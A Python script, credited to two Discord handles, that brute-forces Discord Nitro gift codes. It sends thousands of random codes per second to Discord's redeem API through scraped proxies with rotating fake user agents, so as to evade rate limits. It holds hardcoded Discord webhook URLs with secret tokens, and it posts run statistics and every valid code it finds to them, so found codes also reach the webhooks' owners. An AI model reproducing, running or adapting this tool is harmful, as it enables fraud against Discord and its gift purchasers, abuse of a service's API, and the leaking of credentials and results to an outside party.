#!/usr/bin/env python3
import random
import string
import requests
import threading
import time
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
import os
from datetime import datetime
import sys

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1485352726174109697/yy-qCCh6x3ch8FQqlcCZVRjjJ4Wh1unHjqmeKRREp6bLBSuLEjexdvLz7Jm34ORRaDUW"
VALID_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1485387737845600341/ahnxMXxyl9MkSXLZEOBQaoQY82V50dtzKOwb7zJrI6G4JpsfzxXQUfUvSOJfOT2lAjCz"
USER_ID = "761255648242696206"
DEBUG_INTERVAL = 5  # seconds — change to 300 for 5 minutes

class NitroScanner:
    def __init__(self):
        self.valid_codes = []
        self.invalid_codes = 0
        self.total_checked = 0
        self.rate_limited = 0
        self.running = True
        self.proxies = []
        self.proxy_fail_count = {}
        self.dead_proxies = set()
        self.lock = threading.Lock()
        self.start_time = 0
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        ]
    
    def format_proxy(self, proxy):
        proxy = proxy.strip()
        if proxy.startswith('socks4://') or proxy.startswith('socks5://') or proxy.startswith('http://') or proxy.startswith('https://'):
            return proxy
        if ':' in proxy:
            if 'socks4' in proxy.lower():
                return f'socks4://{proxy.split("://")[-1]}'
            elif 'socks5' in proxy.lower():
                return f'socks5://{proxy.split("://")[-1]}'
            else:
                return f'http://{proxy}'
        return proxy
    
    def detect_proxy_type(self, proxy):
        if proxy.startswith('socks4://'):
            return 'socks4'
        elif proxy.startswith('socks5://'):
            return 'socks5'
        else:
            return 'http'
    
    def load_proxies_from_file(self):
        try:
            with open('proxies.txt', 'r') as f:
                proxies = f.read().strip().split('\n')
                for proxy in proxies:
                    proxy = proxy.strip()
                    if proxy and not proxy.startswith('#'):
                        formatted_proxy = self.format_proxy(proxy)
                        self.proxies.append(formatted_proxy)
            print(f"[+] Loaded {len(self.proxies)} proxies from proxies.txt")
            self.print_proxy_stats()
            return True
        except FileNotFoundError:
            print("[-] proxies.txt not found")
            return False
        except Exception as e:
            print(f"[-] Error loading proxies: {e}")
            return False
    
    def load_proxies_online(self):
        proxy_sources = {
            'http': [
                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
                'https://raw.githubusercontent.com/proxygenerator1/ProxyGenerator/refs/heads/main/ALL/ALL.txt',
                'https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&format=text',
            ],
            'socks4': [
                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt',
                'https://api.proxyscrape.com/v2/?request=get&protocol=socks4&timeout=10000&country=all&format=text',
            ],
            'socks5': [
                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
                'https://api.proxyscrape.com/v2/?request=get&protocol=socks5&timeout=10000&country=all&format=text',
            ]
        }
        
        print("[*] Loading proxies from online sources...")
        all_proxies = set()
        
        for proxy_type, sources in proxy_sources.items():
            print(f"[*] Loading {proxy_type.upper()} proxies...")
            for source in sources:
                try:
                    response = requests.get(source, timeout=10)
                    if response.status_code == 200:
                        proxies = response.text.strip().split('\n')
                        for proxy in proxies:
                            proxy = proxy.strip()
                            if proxy and ':' in proxy:
                                if not proxy.startswith(f'{proxy_type}://'):
                                    proxy = f'{proxy_type}://{proxy}'
                                all_proxies.add(proxy)
                        print(f"[+] Loaded {len(proxies)} {proxy_type.upper()} proxies from {source.split('/')[2]}")
                except Exception as e:
                    print(f"[-] Failed to load {proxy_type.upper()} from {source}: {e}")
        
        self.proxies = list(all_proxies)
        print(f"[+] Total proxies loaded: {len(self.proxies)}")
        self.print_proxy_stats()
        return self.proxies
    
    def print_proxy_stats(self):
        http_count = sum(1 for p in self.proxies if p.startswith('http://') or p.startswith('https://'))
        socks4_count = sum(1 for p in self.proxies if p.startswith('socks4://'))
        socks5_count = sum(1 for p in self.proxies if p.startswith('socks5://'))
        print(f"[+] Proxy breakdown:")
        print(f"    HTTP/HTTPS: {http_count}")
        print(f"    SOCKS4: {socks4_count}")
        print(f"    SOCKS5: {socks5_count}")
    
    def generate_code(self):
        chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=16))
    
    def mark_proxy_failed(self, proxy):
        with self.lock:
            self.proxy_fail_count[proxy] = self.proxy_fail_count.get(proxy, 0) + 1
            if self.proxy_fail_count[proxy] >= 10:
                self.dead_proxies.add(proxy)

    def check_code(self, code, proxy):
        url = f"https://discord.com/api/v9/entitlements/gift-codes/{code}/redeem"
        
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/'
        }
        
        proxy_dict = {
            'http': proxy,
            'https': proxy
        }
        
        try:
            response = requests.post(url, headers=headers, proxies=proxy_dict, timeout=1)
            if response.status_code == 200:
                return {'valid': True, 'code': code, 'proxy': proxy, 'status': 200}
            elif response.status_code == 429:
                return {'valid': False, 'code': code, 'proxy': proxy, 'status': 429}
            else:
                return {'valid': False, 'code': code, 'proxy': proxy, 'status': response.status_code}
        except Exception:
            self.mark_proxy_failed(proxy)
            return {'valid': False, 'code': code, 'proxy': proxy, 'status': 0}
    
    def save_valid_codes(self):
        if self.valid_codes:
            filename = f"valid_nitro_codes_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w') as f:
                for code_data in self.valid_codes:
                    f.write(f"https://discord.gift/{code_data['code']}\n")
            print(f"\n[+] Saved {len(self.valid_codes)} valid codes to {filename}")
            return filename
        return None

    def debug_worker(self):
        while self.running:
            time.sleep(DEBUG_INTERVAL)
            if not self.running:
                break
            try:
                elapsed = time.time() - self.start_time
                speed = self.total_checked / elapsed if elapsed > 0 else 0
                rate_limit_pct = (self.rate_limited / self.total_checked * 100) if self.total_checked > 0 else 0
                alive_proxies = len(self.proxies) - len(self.dead_proxies)
                msg = (
                    f"📊 **Debug Update**\n"
                    f"✅ Checked: {self.total_checked:,}\n"
                    f"⚡ Speed: {speed:.0f} codes/sec\n"
                    f"🚫 Rate limited: {self.rate_limited:,} ({rate_limit_pct:.1f}%)\n"
                    f"🎯 Valid found: {len(self.valid_codes)}\n"
                    f"🌐 Alive proxies: {alive_proxies:,} / {len(self.proxies):,}\n"
                    f"💀 Dead proxies removed: {len(self.dead_proxies):,}\n"
                    f"⏱️ Uptime: {elapsed/60:.1f} minutes"
                )
                requests.post(WEBHOOK_URL, json={"content": msg})
            except Exception:
                continue

    def scan_worker(self, code_queue, proxy_queue):
        while self.running:
            try:
                code = code_queue.get(timeout=1)
                proxy = proxy_queue.get(timeout=1)

                if proxy in self.dead_proxies:
                    code_queue.task_done()
                    continue
                
                result = self.check_code(code, proxy)
                
                with self.lock:
                    self.total_checked += 1

                    if result['status'] == 429:
                        self.rate_limited += 1
                    
                    if result['valid']:
                        proxy_type = self.detect_proxy_type(result['proxy'])
                        self.valid_codes.append({
                            'code': result['code'],
                            'proxy': result['proxy'],
                            'proxy_type': proxy_type,
                            'timestamp': datetime.now()
                        })
                        
                        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        
                        print(f"\n{'='*70}")
                        print(f"[{timestamp}] VALID NITRO CODE FOUND!")
                        print(f"CODE: https://discord.gift/{result['code']}")
                        print(f"TOTAL VALID: {len(self.valid_codes)}")
                        print(f"TOTAL CHECKED: {self.total_checked:,}")
                        print(f"PROXY: {result['proxy']}")
                        print(f"PROXY TYPE: {proxy_type.upper()}")
                        print(f"{'='*70}\n")

                        requests.post(VALID_WEBHOOK_URL, json={"content": f"<@{USER_ID}> 🎉 **VALID NITRO CODE FOUND!**\nhttps://discord.gift/{result['code']}\nProxy: {result['proxy']} ({proxy_type.upper()})"})
                        
                        with open('SNIPED_CODES.txt', 'a') as f:
                            f.write(f"[{timestamp}] https://discord.gift/{result['code']} | Proxy: {result['proxy']}\n")

                    if self.total_checked % 1000 == 0:
                        elapsed = time.time() - self.start_time
                        speed = self.total_checked / elapsed if elapsed > 0 else 0
                        status = (f"\r[{datetime.now().strftime('%H:%M:%S')}] "
                                 f"CHECKED: {self.total_checked:,} | "
                                 f"VALID: {len(self.valid_codes)} | "
                                 f"RATE LIMITED: {self.rate_limited:,} | "
                                 f"DEAD PROXIES: {len(self.dead_proxies):,} | "
                                 f"SPEED: {speed:.0f}/s | "
                                 f"QUEUE: {code_queue.qsize():,}")
                        sys.stdout.write(status)
                        sys.stdout.flush()

                if proxy not in self.dead_proxies:
                    proxy_queue.put(proxy)
                code_queue.task_done()
                
            except Exception:
                continue
    
    def generate_codes_worker(self, code_queue, codes_per_second):
        while self.running:
            batch_start = time.time()
            for _ in range(codes_per_second):
                code = self.generate_code()
                code_queue.put(code)
            elapsed = time.time() - batch_start
            if elapsed < 1:
                time.sleep(1 - elapsed)
    
    def start(self):
        self.start_time = time.time()

        requests.post(WEBHOOK_URL, json={"content": "✅ **Nitro Scanner has started!**\nScanning for valid codes now..."})
        
        print("\n" + "="*70)
        print("     Nitro Scanner v1.0")
        print("     Made by @2x8d and @itzconsit")
        print("="*70)
        print("\n[CONFIGURATION]")
        
        if not self.load_proxies_from_file():
            print("[*] No local proxies found, loading from online sources...")
            self.load_proxies_online()
        
        use_proxies = len(self.proxies) > 0
        
        if use_proxies:
            print(f"[+] Using {len(self.proxies)} proxies total")
        else:
            print("[!] No proxies available, running without proxies")
            print("[!] Your IP may get rate limited")
        
        code_queue = Queue(maxsize=100000)
        proxy_queue = Queue()
        
        if use_proxies:
            for proxy in self.proxies:
                proxy_queue.put(proxy)
        
        NUM_THREADS = 5000
        CODES_PER_SECOND = 8000
        
        print(f"\n[SETTINGS]")
        print(f"Threads: {NUM_THREADS}")
        print(f"Generation rate: {CODES_PER_SECOND:,} codes/sec")
        print(f"Proxy rotation: {'Enabled' if use_proxies else 'Disabled'}")
        print(f"Proxy types: HTTP, SOCKS4, SOCKS5")
        print(f"\n[OUTPUT]")
        print(f"Valid codes will appear here instantly")
        print(f"All found codes saved to: SNIPED_CODES.txt")
        print(f"\n[STATUS]")
        print("Press Ctrl+C to stop\n")
        
        # Start debug background thread
        debug_thread = threading.Thread(target=self.debug_worker, daemon=True)
        debug_thread.start()

        gen_thread = threading.Thread(target=self.generate_codes_worker, args=(code_queue, CODES_PER_SECOND), daemon=True)
        gen_thread.start()
        
        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
            futures = []
            for _ in range(NUM_THREADS):
                future = executor.submit(self.scan_worker, code_queue, proxy_queue)
                futures.append(future)
            
            try:
                while self.running:
                    time.sleep(0.1)
                    if not use_proxies and code_queue.qsize() > 50000:
                        time.sleep(0.5)
            except KeyboardInterrupt:
                print("\n\n[STOPPING] Saving results...")
                self.running = False
                requests.post(WEBHOOK_URL, json={"content": "🛑 **Nitro Scanner has stopped!**"})
        
        elapsed = time.time() - self.start_time
        print("\n" + "="*70)
        print("[FINAL STATISTICS]")
        print(f"Valid codes found: {len(self.valid_codes)}")
        print(f"Total codes checked: {self.total_checked:,}")
        print(f"Rate limited: {self.rate_limited:,}")
        print(f"Dead proxies removed: {len(self.dead_proxies):,}")
        print(f"Average speed: {self.total_checked/elapsed:.0f} codes/sec")
        print(f"Total time: {elapsed:.1f} seconds")
        
        if self.valid_codes:
            print(f"\n[PROXY BREAKDOWN]")
            http_valid = sum(1 for c in self.valid_codes if c['proxy_type'] == 'http')
            socks4_valid = sum(1 for c in self.valid_codes if c['proxy_type'] == 'socks4')
            socks5_valid = sum(1 for c in self.valid_codes if c['proxy_type'] == 'socks5')
            print(f"HTTP proxies: {http_valid} codes found")
            print(f"SOCKS4 proxies: {socks4_valid} codes found")
            print(f"SOCKS5 proxies: {socks5_valid} codes found")

            print("\n[FOUND CODES]")
            for i, code_data in enumerate(self.valid_codes, 1):
                print(f"{i}. https://discord.gift/{code_data['code']} (via {code_data['proxy_type'].upper()})")
            print(f"\n[SAVED] All codes saved to SNIPED_CODES.txt")

        else:
            print("\n[RESULT] No valid codes found during this session")
        
        requests.post(WEBHOOK_URL, json={"content": "🛑 **Nitro Scanner has stopped!**"})
        self.save_valid_codes()
        
        print("\n" + "="*70)

def main():
    scanner = NitroScanner()
    scanner.start()

if __name__ == "__main__":
    main()